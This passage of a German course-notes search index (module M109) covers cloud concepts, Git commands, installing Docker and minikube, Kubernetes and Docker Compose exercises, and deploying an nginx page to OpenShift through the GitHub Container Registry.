Datenschutz- und Sicherheitsbedenken</li> <li>Abh\u00e4ngigkeit von Internetverbindung und Cloud-Anbieter</li> <li>Potenzielle Kosten bei hoher Datenmenge oder intensiver Nutzung</li> </ul> </li> <li>Welche Dienstleistungen werden in Ihrem Betrieb On-Premise (eigenes Rechenzentrum) betrieben?     Speicher, Webdienste, Citrix, SAP, SNOW</li> <li>Wie werden technologische Beitr\u00e4ge in der Cloud geteilt bzw. zur Verf\u00fcgung gestellt?     Technologische Beitr\u00e4ge in der Cloud werden in der Regel \u00fcber APIs (Application Programming Interfaces) geteilt oder zur Verf\u00fcgung gestellt. Ein API erm\u00f6glicht es, dass unterschiedliche Softwareanwendungen miteinander interagieren. In Bezug auf die Cloud k\u00f6nnen APIs beispielsweise genutzt werden, um Daten zwischen verschiedenen Cloud-Diensten zu \u00fcbertragen oder um die Funktionalit\u00e4ten eines Cloud-Dienstes in eine andere Anwendung zu integrieren.</li> </ul>"},{"location":"ZLI/M109/#block-2-cloud-anbieter-und-git","title":"Block 2: Cloud Anbieter und git","text":""},{"location":"ZLI/M109/#auftrag-22-git-zur-sourcecode-und-konfigurationsverwaltung","title":"Auftrag 2.2: Git zur Sourcecode- und Konfigurationsverwaltung","text":"<p>Git-Benutzernamen und E-Mail-Adresse konfigurieren: <pre><code>git config --global user.name \"Ihr Name\"\ngit config --global user.email \"IhreEmail@beispiel.com\"\n</code></pre></p> <p>Ein Verzeichnis f\u00fcr Ihr Projekt erstellen und in dieses Verzeichnis wechseln: <pre><code>cd beispiel\n</code></pre></p> <p>Ein leeres Git-Repository in diesem Verzeichnis initialisieren: <pre><code>git init\n</code></pre></p> <p>Eine README-Datei zum Git-Repository hinzuf\u00fcgen: <pre><code>git add README\n</code></pre></p> <p>Den Status Ihres Repositories \u00fcberpr\u00fcfen: <pre><code>git status\n</code></pre></p> <p>Ihren ersten Commit durchf\u00fchren: <pre><code>git commit -m \"Erste Version\"\n</code></pre></p> <p>\u00c4nderungen mit git diff anzeigen und in ein Patch packen: <pre><code>git diff\ngit diff --no-prefix &gt; patch.diff-\n</code></pre></p> <p>Die Historie Ihres Repositories anzeigen: <pre><code>git log\n</code></pre></p> <p>Einen neuen Branch erstellen und zwischen Branches wechseln: <pre><code>git checkout -b new_branch\ngit checkout master\n</code></pre></p> <p>\u00c4nderungen vom neuen Branch in den Master-Branch \u00fcbernehmen: <pre><code>git merge new_branch\n</code></pre></p> <p>Den Master-Zweig in Main umbenennen: <pre><code>git branch -m master main\ngit push -u origin main\ngit push origin --delete master\n</code></pre></p> <p>Tags in Git erstellen und anzeigen: <pre><code>git tag\ngit tag -a v1.4 -m 'my version 1.4'\ngit show\n</code></pre></p>"},{"location":"ZLI/M109/#block-3-einfuhrung-in-container-technologie","title":"Block 3: Einf\u00fchrung in Container-Technologie","text":""},{"location":"ZLI/M109/#installation-docker-engine","title":"Installation Docker Engine","text":""},{"location":"ZLI/M109/#dependencies","title":"Dependencies","text":"<pre><code>sudo apt update\nsudo apt install -y apt-transport-https ca-certificates curl gnupg-agent software-properties-common\n</code></pre>"},{"location":"ZLI/M109/#repository","title":"Repository","text":"<pre><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n</code></pre>"},{"location":"ZLI/M109/#docker-engine","title":"Docker Engine","text":"<pre><code>sudo apt-get update\nsudo apt-get install docker-ce docker-ce-cli containerd.io -y\n</code></pre>"},{"location":"ZLI/M109/#anpassungen-user-dieser-schritt-ist-wichtig-da-sonst-immer-mit-sudo-gearbeitet-werden-muss","title":"Anpassungen User (dieser Schritt ist wichtig, da sonst immer mit sudo gearbeitet werden muss)","text":"<pre><code>sudo usermod -aG docker $USER\nnewgrp docker\n</code></pre>"},{"location":"ZLI/M109/#auftrag-31-grundlagen-container-technologie","title":"Auftrag 3.1: Grundlagen Container-Technologie","text":"<ol> <li>Was ist Container-Technologie oder Container-Virtualisierung?     Container-Technologie oder Container-Virtualisierung ist ein Ansatz zur Softwareentwicklung, bei dem ein Anwendung und ihre Abh\u00e4ngigkeiten in einem Prozess gekapselt werden, der von der zugrunde liegenden Betriebssysteminfrastruktur isoliert ist. Jeder Container teilt sich das Betriebssystem-Host und in der Regel auch die Bin\u00e4rdateien und Bibliotheken, ist aber in seiner Ausf\u00fchrung vom Rest des Systems getrennt.</li> <li>Was sind die Vor- und Nachteile der Container-Technologie zu virtuellen Servern (VM)?     Vorteile von Containern gegen\u00fcber VMs:     \u2022   Geringerer Ressourcenbedarf: Container ben\u00f6tigen weniger Systemressourcen als VMs, da sie weniger Overhead haben, da sie das Betriebssystem nicht duplizieren m\u00fcssen.     \u2022   Schnellere Startzeiten: Container k\u00f6nnen in Sekundenbruchteilen gestartet und gestoppt werden, w\u00e4hrend VMs Minuten ben\u00f6tigen.     \u2022   Portabilit\u00e4t: Anwendungen in Containern k\u00f6nnen einfach zwischen verschiedenen Systemen und Cloud-Plattformen verschoben werden.     Nachteile von Containern gegen\u00fcber VMs:     \u2022   Geringere Isolierung: Da Container das gleiche Betriebssystem teilen, sind sie weniger isoliert als VMs.     \u2022   Spezifische Betriebssystemabh\u00e4ngigkeiten: Container sind oft an das zugrunde liegende Betriebssystem gebunden, w\u00e4hrend VMs beliebige Betriebssysteme ausf\u00fchren k\u00f6nnen.</li> <li>Welche Produkte kennen Sie im Zusammenhang mit virtuellen Servern und Containern?     Im Zusammenhang mit virtuellen Servern sind Produkte wie VMware vSphere, Microsoft Hyper-V und Oracle VM bekannt. Bez\u00fcglich Containern sind Docker, Kubernetes, Red Hat OpenShift und Rancher einige der bekanntesten Technologien.</li> <li>Wie unterscheiden sich die Technologien VM und Container in Bezug auf Bereitstellung, Speicherplatz, Portabilit\u00e4t, Effizienz und Betriebssystem (Kernel)?     \u2022   Bereitstellung: Container k\u00f6nnen schneller bereitgestellt werden als VMs, da sie weniger Ressourcen ben\u00f6tigen.     \u2022   Speicherplatz: Container ben\u00f6tigen weniger Speicherplatz als VMs, da sie das Betriebssystem nicht duplizieren m\u00fcssen.     \u2022   Portabilit\u00e4t: Container sind portabler als VMs, da sie die gesamte Anwendung und ihre Abh\u00e4ngigkeiten in einem einzigen Paket kapseln.     \u2022   Effizienz: Container sind effizienter als VMs in Bezug auf Systemressourcen, da sie weniger Overhead haben.     \u2022   Betriebssystem (Kernel): VMs k\u00f6nnen verschiedene Betriebssysteme auf demselben physischen Host ausf\u00fchren, w\u00e4hrend Container das Host-Betriebssystem teilen m\u00fcssen.</li> <li>K\u00f6nnen virtuelle Server immer durch Container ersetzt werden?     Nein, es gibt Szenarien, in denen VMs eine bessere Wahl sind. Zum Beispiel, wenn vollst\u00e4ndige Isolierung oder spezifische Betriebssystemanforderungen erforderlich sind. Au\u00dferdem k\u00f6nnen bestimmte Anwendungen oder Systeme aufgrund ihrer spezifischen Anforderungen oder Abh\u00e4ngigkeiten besser f\u00fcr VMs geeignet sein.</li> <li>Was ist unterschied zwischen Self-Managed und Fully Managed?     Ein Self-Managed-Service bedeutet, dass der Nutzer selbst f\u00fcr die Installation, Wartung, Aktualisierungen und Sicherheit verantwortlich ist. Der Nutzer hat mehr Kontrolle, aber auch mehr Verantwortung.     Ein Fully Managed Service wird vollst\u00e4ndig vom Anbieter verwaltet. Der Anbieter k\u00fcmmert sich um die Installation, Wartung, Aktualisierungen und Sicherheit. Dies kann die Belastung f\u00fcr den Nutzer reduzieren, nimmt ihm jedoch auch einen Teil der Kontrolle ab.</li> </ol>"},{"location":"ZLI/M109/#auftrag-32-webserver-mit-docker","title":"Auftrag 3.2: Webserver mit Docker","text":"<p>Lassen Sie ihre HTML Webseite in einem Container laufen. Nutzen Sie dazu Container Images von Docker Hub, z.B. das Image von nginx: https://hub.docker.com/_/nginx</p> <pre><code>docker run -p 8080:80 -v /home/minikube/index.html:/usr/share/nginx/html/index.html index:latest\n</code></pre> docker-compose.yml<pre><code>version: '3.8'\nservices:\nnginx:\nimage: index:latest\nports:\n- 8080:80\nvolumes:\n- /home/minikube/index.html:/usr/share/nginx/html/index.html\n</code></pre>"},{"location":"ZLI/M109/#block-4-container-orchestration","title":"Block 4: Container Orchestration","text":""},{"location":"ZLI/M109/#auftrag-41-container-orchestrierung","title":"Auftrag 4.1: Container-Orchestrierung","text":"<ol> <li> <p>Warum braucht man Container-Orchestrierung?     Container-Orchestrierung wird ben\u00f6tigt, um komplexe Anwendungen mit vielen Containern zu verwalten, zu skalieren, zu \u00fcberwachen und hochverf\u00fcgbar zu machen.</p> </li> <li> <p>Wie funktioniert Container-Orchestrierung?     Bei der Container-Orchestrierung werden Tools und Plattformen verwendet, um die Bereitstellung, Verwaltung und Kommunikation von Containern zu automatisieren und zu koordinieren.</p> </li> <li> <p>Welche Container-Orchestrierung Technologien kennen Sie?     Einige bekannte Container-Orchestrierungstechnologien sind Docker Swarm, Kubernetes, Apache Mesos und Amazon ECS (Elastic Container Service).</p> </li> <li> <p>Was versteht man unter \"Scaling Containers\"?     \"Scaling Containers\" bezieht sich auf die F\u00e4higkeit, die Anzahl der Containerinstanzen, die eine Anwendung ausf\u00fchren, dynamisch zu erh\u00f6hen oder zu verringern, um die Anforderungen des Workloads zu erf\u00fcllen.</p> </li> <li> <p>Was gibt es f\u00fcr Deployment-Strategien?     Es gibt verschiedene Deployment-Strategien wie Rolling Update, Blue-Green Deployment, Canary Deployment und A/B-Testing, die es erm\u00f6glichen, Anwendungen schrittweise zu aktualisieren oder neue Versionen bereitzustellen, um Ausfallzeiten zu minimieren und einen reibungslosen \u00dcbergang sicherzustellen.</p> </li> </ol>"},{"location":"ZLI/M109/#kubernetes-minikube-was-ist-das","title":"Kubernetes - minikube - Was ist das?","text":"<p>minikube ist eine lokale Kubernetes Installation mit dem Ziel, einfach und schnell Kubernetes zu lernen, und simple Kubernetes Umgebungen zu entwickeln und auszutesten.</p> <p>Systemvoraussetzungen: 2 CPUs oder mehr Mindestens 2GB RAM Mindestens 20GB Disk Space Internet Verbindung Container oder virtuelle Umgebung: Docker, Hyperkit, Hyper-V, KVM, Parallels, Podman, VirtualBox, oder VMware Fusion/Workstation</p>"},{"location":"ZLI/M109/#installation-minikube","title":"Installation minikube","text":""},{"location":"ZLI/M109/#dependencies_1","title":"Dependencies","text":"<pre><code>sudo apt install curl wget apt-transport-https -y </code></pre>"},{"location":"ZLI/M109/#download-und-installation-minikube","title":"Download und Installation minikube","text":"<pre><code>curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64\nsudo install minikube-linux-amd64 /usr/local/bin/minikube\n</code></pre>"},{"location":"ZLI/M109/#download-und-installation-kubectl","title":"Download und Installation kubectl","text":"<pre><code>curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nsudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n</code></pre>"},{"location":"ZLI/M109/#ein-paar-minikube-addons","title":"Ein paar minikube Addons","text":"<pre><code>minikube start --driver=docker\nminikube addons enable ingress\nminikube addons enable dashboard\nminikube addons enable metrics-server\n</code></pre>"},{"location":"ZLI/M109/#reboot-linux","title":"Reboot Linux","text":"<pre><code>sudo reboot\n</code></pre>"},{"location":"ZLI/M109/#start-minikube-und-dashboard","title":"Start minikube und Dashboard","text":"<pre><code>minikube start --driver=docker\nminikube dashboard --url\n</code></pre> <p>Um das Dashboard von einem anderen Computer zu \u00f6ffnen kann man den folgenden Befehl benutzen um die Ports zu Mappen:</p> <pre><code>ssh -L &lt;Port&gt;:127.0.0.1:&lt;Port&gt; &lt;User&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"ZLI/M109/#auftrag-42-container-orchestration-mit-docker-compose","title":"Auftrag 4.2 Container Orchestration mit Docker Compose","text":"<ol> <li>Folgen Sie dem Tutorial https://docs.docker.com/compose/gettingstarted/</li> <li>Erstellen Sie ein Diagram und beschreiben Sie die einzelnen verwendeten Container</li> <li>Beantworten Sie folgende Fragen<ol> <li>Was ist Redis?     Redis ist eine Open-Source-Datenbank, die als Schl\u00fcssel-Wert-Speicher dient und schnellen Zugriff auf Daten erm\u00f6glicht. Es wird h\u00e4ufig als Zwischenspeicher oder Caching-Mechanismus eingesetzt.</li> <li>Welche Ports werden genutzt?     Redis verwendet standardm\u00e4\u00dfig den Port 6379 f\u00fcr die Kommunikation zwischen Client und Server. Dieser Port wird in der Regel f\u00fcr den Zugriff auf Redis-Dienste genutzt.</li> <li>Was ist die Bedeutung von ENV im DOCKERFILE?     ENV (Environment) in einem Dockerfile erm\u00f6glicht das Setzen von Umgebungsvariablen innerhalb des Container-Images. Diese Variablen k\u00f6nnen w\u00e4hrend der Laufzeit verwendet werden, um bestimmte Konfigurationswerte oder Parameter anzupassen, wie z.B. Datenbankverbindungszeichenfolgen oder API-Schl\u00fcssel.</li> </ol> </li> </ol>"},{"location":"ZLI/M109/#auftrag-43-minikube-kubernetes-ganz-einfach-crash-kurs","title":"Auftrag 4.3: minikube - Kubernetes ganz einfach (Crash Kurs)","text":"<p>Die installierte Kubernetes Umgebung muss nach jedem Reboot/Neustart des Systems mit den folgenden Befehlen gestartet werden.</p> <pre><code>minikube start --driver=docker\nminikube dashboard --url\n</code></pre> <ul> <li>Erstellen Sie in ihrem privaten Git Account ein Repository mit dem Namen dev_minikube</li> <li>Erstellen Sie im Homeverzeichnis des Benutzers ein Verzeichnis dev_minikube</li> <li>Initialisieren Sie ihr Git Repository in diesem Verzeichnis, erstellen die 4 ben\u00f6tigten Files (Git Repository der Konfigurationsfiles) f\u00fcr Deployment und Services und stellen Sie sicher, dass diese Konfigurationsfiles in ihrem Git Account auf github.com gespeichert sind.</li> </ul> <p>Sind die Konfigurationsfiles einmal erstellt, gestaltet sich das eigentliche Deployment sichtlich einfach:</p> <pre><code>kubectl apply -f mongo-config.yaml\nkubectl apply -f mongo-secret.yaml\nkubectl apply -f mongo.yaml\nkubectl apply -f webapp.yaml\n</code></pre> <p>Das wars auch schon. Jetzt m\u00fcssen Sie nur noch herausfinden, \u00fcber welchen URL bzw. IP Adresse und Port auf Ihren neu deployten Service zugegriffen werden kann.</p> <p>IP Adresse des minikube Nodes herausfinden:</p> <pre><code>minikube ip\n</code></pre> <p>Port des Webapp Services (Nodeport) herausfinden: <pre><code>kubectl describe service webapp\n</code></pre></p> <p>URL w\u00e4re dann zusammengesetzt: http://192.168.49.2:30100</p> <p>Falls die Webseite nicht erreichbar ist, kann der folgende Befehl ausgef\u00fchrt werden: `</p> <pre><code>minikube service webapp-service\n</code></pre>"},{"location":"ZLI/M109/#block-6-openshift-plattform-kennenlernen","title":"Block 6: Openshift Plattform kennenlernen","text":""},{"location":"ZLI/M109/#auftrag-61-openshift-appuio-projekt-einrichten","title":"Auftrag 6.1: OpenShift APPUiO Projekt einrichten","text":""},{"location":"ZLI/M109/#container-registry-login","title":"Container Registry Login","text":"<p>Als Container-Registry, verwenden wir die Github Container Registry. Um Images zu verwalten und in OpenShift abzufragen, befolgen Sie folgende Schritte:</p> <p></p>"},{"location":"ZLI/M109/#schritt-1-token-erstellen","title":"Schritt 1 - Token Erstellen","text":"<p>Erstellen Sie unter folgendem Link einen (Classic) Personal Access Token (PAT) mit den write:packages Berechtigungen.</p> <p>https://github.com/settings/tokens</p>"},{"location":"ZLI/M109/#schritt-2-docker-login","title":"Schritt 2 - Docker Login","text":"<p>Loggen Sie sich nun lokal in die Container Registry ein. Als Passwort dient ihnen der zuvor erstellte PAT.</p> <pre><code>docker login ghcr.io -u &lt;Github Username&gt;\n</code></pre> <p></p>"},{"location":"ZLI/M109/#schritt-3-openshift-login","title":"Schritt 3 - OpenShift Login","text":"<p>Damit OpenShift ihre privaten Container-Images herunterladen kann, m\u00fcssen sie f\u00fcr ihr Projekt die Zugangsdaten definieren. Stellen Sie sicher, dass Sie sich auf dem korrekten Projekt befinden:</p> <pre><code>oc project &lt;openshift username&gt;\n</code></pre> <p></p> <p>Erstellen Sie anschliessend ein Secret mit den Credentials und konfigurieren Sie die Credentials als Default:</p> <pre><code>oc create secret docker-registry ghcr --docker-server=ghcr.io --docker-username=&lt;Github Username&gt; --docker-password=&lt;Github PAT&gt;\noc secrets link default ghcr --for=pull\n</code></pre> <p></p> <p></p>"},{"location":"ZLI/M109/#auftrag-62-html-seite-auf-openshift-deployen","title":"Auftrag 6.2: HTML-Seite auf OpenShift deployen","text":"<ol> <li> <p>Erstellen Sie einen neuen Ordner und kopieren Sie die HTML Seite aus Auftrag 1.1 und das Dockerfile aus Auftrag 3.2. Ersetzen Sie das Baseimage \"nginx\" mit \"nginxinc/nginx-unprivileged\".     <pre><code>cd\nmkdir auftrag-6.2\ncd auftrag-6.2\necho '&lt;H1&gt; Auftrag 6.2: HTML-Seite auf OpenShift deployen &lt;/H1&gt;' &gt; index.html\necho 'FROM nginxinc/nginx-unprivileged' &gt; Dockerfile\necho 'WORKDIR /usr/share/nginx/html' &gt;&gt; Dockerfile\necho 'COPY index.html index.html' &gt;&gt; Dockerfile\n</code></pre></p> </li> <li> <p>Builden und testen Sie den Container, sodass dieser die Webseite auf Port 8080 publiziert.     <pre><code>docker build -t ghcr.io/&lt;Github Username&gt;/html-page:v1 .\ndocker run -p 8080:8080 ghcr.io/&lt;Github Username&gt;/html-page:v1\n</code></pre></p> <p></p> </li> <li> <p>Pushen Sie den Container in die Github Container Registry:     <pre><code>docker push ghcr.io/&lt;Github Username&gt;/html-page:v1\n</code></pre></p> <p></p> </li> <li> <p>Erstellen Sie ein Deployment f\u00fcr den Container, wie Sie es in Auftrag 4.2 gelernt haben. Und applizieren Sie dieses:     deployment.yaml<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: m210-page\nlabels:\napp: m210-page\nspec:\nreplicas: 3\nselector:\nmatchLabels:\napp: m210-page\ntemplate:\nmetadata:\nlabels:\napp: m210-page\nspec:\ncontainers:\n- name: m210-page\nimage: ghcr.io/masluse/html-page:v1\nports:\n- containerPort: 8080\n</code></pre></p> <pre><code>oc apply -f deployment.yaml\n</code></pre> <p></p> <p></p> deployment.yaml<pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: m210-page\nlabels:\napp: m210-page\nspec:\nreplicas: 3\nselector:\nmatchLabels:\napp: m210-page\ntemplate:\nmetadata:\nlabels:\napp: m210-page\nspec:\ncontainers:\n- name: m210-page\nimage: ghcr.io/masluse/html-page:v1\nports:\n- containerPort: 8080\n---\napiVersion: v1\nkind: Service\nmetadata:\nlabels:\napp: m210-page\nname: m210-page\nspec:\nports:\n- name: 8080-tcp\nport: 8080\nprotocol: TCP\ntargetPort: 8080\nselector:\napp: m210-page\nsessionAffinity: None\ntype: ClusterIP\n---\napiVersion: route.openshift.io/v1\nkind: Route\nmetadata:\nlabels:\napp: m210-page\nname: m210-page\nspec:\nport:\ntargetPort: 8080-tcp\nto:\nkind: Service\nname: m210-page\ntls:\ntermination: edge\ninsecureEdgeTerminationPolicy: Redirect\n</code></pre> <pre><code>oc apply -f deployment.yaml\n</code></pre> <p></p> </li> <li> <p>Rufen Sie die erstellte Route ab und testen Sie die Webseite:     <pre><code>oc get routes\n</code></pre> https://m210-page-zlic-mregli1.apps.exoscale-ch-gva-2-0.appuio.cloud/ </p> </li> </ol>"}]}